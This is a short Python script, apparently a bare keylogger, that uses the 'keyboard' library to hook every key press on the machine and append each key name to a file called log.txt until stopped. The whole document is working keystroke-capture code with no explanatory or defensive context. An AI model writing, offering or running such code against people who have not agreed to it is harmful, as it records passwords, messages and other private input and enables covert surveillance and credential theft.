import keyboard

with open("log.txt", "a") as f:
    def on_key_event(event):
        f.write(f"{event.name}\n")
        f.flush()

    keyboard.on_press(on_key_event)
    keyboard.wait()  
